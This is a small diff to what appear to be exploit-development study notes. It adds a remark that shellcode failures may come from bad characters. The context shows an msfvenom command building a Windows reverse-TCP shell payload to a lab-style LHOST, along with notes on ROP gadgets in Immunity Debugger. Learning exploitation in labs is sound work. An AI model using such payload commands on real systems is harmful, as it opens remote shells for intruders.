@@ -30,6 +30,10 @@ msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6
   * We need the stack executable.
   * ROP objects need to be present which do not have null byte in its address.
 
+3\) Even if the shellcode is not running
+
+* It could be due to bad characters. There is a method to find bad characters.
+
 ## Finding ROP in windows immunity debugger
 
 * Right click on the command box -&gt; Search for -&gt; Sequence of commands
